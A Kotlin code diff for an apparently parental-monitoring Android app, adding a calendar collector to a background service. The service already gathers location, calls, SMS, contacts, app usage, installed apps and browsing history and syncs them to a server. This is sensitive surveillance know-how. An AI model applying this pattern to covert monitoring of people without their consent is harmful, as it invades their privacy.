@@ -12,6 +12,7 @@ import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.parental.agent.collectors.apps.InstalledAppCollector
 import com.parental.agent.collectors.appusage.AppUsageCollector
+import com.parental.agent.collectors.calendar.CalendarCollector
 import com.parental.agent.collectors.calls.CallCollector
 import com.parental.agent.collectors.contacts.ContactCollector
 import com.parental.agent.collectors.location.LocationCollector
@@ -67,6 +68,7 @@ class ForegroundService : Service() {
             val appUsageCollector = AppUsageCollector(this@ForegroundService)
             val installedAppCollector = InstalledAppCollector(this@ForegroundService)
             val webHistoryCollector = WebHistoryCollector(this@ForegroundService)
+            val calendarCollector = CalendarCollector(this@ForegroundService)
 
             while (isActive) {
                 try {
@@ -77,9 +79,10 @@ class ForegroundService : Service() {
                     val usageCount = appUsageCollector.collect()
                     val installedAppCount = installedAppCollector.collect()
                     val historyCount = webHistoryCollector.collect()
+                    val calendarCount = calendarCollector.collect()
 
-                    if (locCount > 0 || callCount > 0 || smsCount > 0 || contactCount > 0 || usageCount > 0 || installedAppCount > 0 || historyCount > 0) {
-                        Log.d(TAG, "New Telemetry collected: Loc=$locCount, Calls=$callCount, SMS=$smsCount, Contacts=$contactCount, Usage=$usageCount, InstalledApps=$installedAppCount, History=$historyCount")
+                    if (locCount > 0 || callCount > 0 || smsCount > 0 || contactCount > 0 || usageCount > 0 || installedAppCount > 0 || historyCount > 0 || calendarCount > 0) {
+                        Log.d(TAG, "New Telemetry collected: Loc=$locCount, Calls=$callCount, SMS=$smsCount, Contacts=$contactCount, Usage=$usageCount, InstalledApps=$installedAppCount, History=$historyCount, Calendar=$calendarCount")
                     }
 
                     // Perform chunked batch network sync until all pending unsynced events are drained
